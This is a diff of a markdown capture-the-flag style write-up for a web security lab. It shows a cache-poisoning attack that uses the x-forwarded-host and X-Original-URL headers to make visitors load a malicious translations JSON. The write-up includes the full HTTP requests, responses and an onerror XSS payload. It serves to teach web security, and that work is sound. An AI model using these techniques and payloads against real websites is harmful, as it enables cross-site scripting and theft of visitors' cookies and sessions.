@@ -329,17 +329,17 @@ A user visits the home page roughly once a minute and their language is set to E
 
 To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
 
-1. investigate with param-miner:
+1. **investigate with param-miner:**
 ```
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host~%s.%h
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: origin~https://%s.%h
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: origin
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-original-url~/%s
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-forwarded-host
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: x-original-url~/%s
-Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net: sec-websocket-version
+Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net:
+origin
+x-forwarded-host
+x-original-url
+sec-websocket-version
 ```
-2. in **GET / HTTP/1.1** observe
+2.  **study home page:**
+
+try diferent headers with *test* value in **GET / HTTP/1.1** observe that **x-forwarded-host** yields:
 ```
        <script>
             data = {
@@ -354,4 +354,130 @@ Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.ne
        </script>
 ```
 
-3. use the **x-forwarded-host** to point resource to our domain, and prepare the exploit file in the same path as the format **/resources/json/translations.json** 
+this call for json implies code injection point. use the **x-forwarded-host** to point to xploit server and check exploit-server-log for a hit. once the link confirmed. we leave it for now.
+
+change to any language and back to english. study process. observe a cookie was generated with session and language setting. send **GET / HTTP/1.1** request (with the cookie) to repeater. 
+
+
+2. **GET /resources/js/translations.js HTTP/1.1** 
+observe there are 2 almost identical **GET /resources/js/translations.js HTTP/1.1** requests. send to camparer and observe changes in headers value:
+```h
+Sec-Fetch-Dest: script  --> empty //(what is the intended use of the fetched data)
+Sec-Fetch-Mode: no-cors --> cors //allows Cross-Origin Resource Sharing   
+..
+Sec-Gpc: 1
+```
+the responses are identical.
+
+lets manipulate the 2nd requets, with cors available. in response observe:
+```javascript
+
+function initTranslations(jsonUrl)
+{
+    const lang = document.cookie.split(';') // cookie parsing
+//..
+    const translate = (dict, el) => { // tanslating
+    }
+//..
+    fetch(jsonUrl) //json processing
+//..
+            lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
+        }); // the actual processing rules of translation. anything but english is being translated.
+}
+```
+
+3.  **GET /resources/json/translations.json HTTP/1.1**
+the request for the translating object
+
+
+# plan your attack:
+1. by using **x-forwarded-host** in **GET / HTTP/1.1** point to explout server. 
+2. in exploit server create Json at the format of **GET /resources/json/translations.json HTTP/1.1** and include XSS attack in any language but english. 
+3. cache attack
+4. 
+
+
+1. **stage 1:** crafting Json object that pops in explot server (needed to try different HTML event)
+File:
+```
+/resources/json/translations.json
+```
+
+Head:
+```
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *
+```
+
+Body:
+```
+{
+    "en": {
+        "name": "English"
+    },
+    "es": {
+        "name": "attack",
+        "translations": {
+            "Home": "<img src=x onerror=alert('document.cookie');>",
+            "View details": "fff",
+            "Description:": "Descripn:"
+        }
+    }
+```
+
+after further examine it seems the best injection point lies in the language change page:
+```
+GET /?localized=1 HTTP/1.1
+Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
+Cookie: lang=es
+x-forwarded-host: exploit-0a6b00b80383b6cbc0a5105601d60084.exploit-server.net
+
+
+```
+this poisns the spanish page wiht our xss attack
+
+2. **stage 2:** redirecting all english home request to spanish:
+we use the **X-Original-URL** which changes the path of the request to set the language to spanish.
+
+```
+GET / HTTP/1.1
+Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
+X-Original-URL: /setlang/es
+
+
+```
+we see in the response a problem the headers set-cookie cant be used to poison the cache: 
+```
+Set-Cookie: lang=es; Path=/; Secure
+Set-Cookie: session=0zHO1GJ3lEH7d8KNr7g1tNdiVrXR2bjB;
+```
+we change the / into \ and hope the server will normalize: 
+
+```
+GET / HTTP/1.1
+Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
+X-Original-URL: /setlang\es
+
+
+```
+response:
+```
+HTTP/1.1 302 Found
+Location: /setlang/es?cb=1
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 0
+
+```
+there is no set-cookie header so its good to poison
+
+3. send both stages, one after the other and wait for the victim to load the poisoned pages
+
+# POP!
+
+
+
+
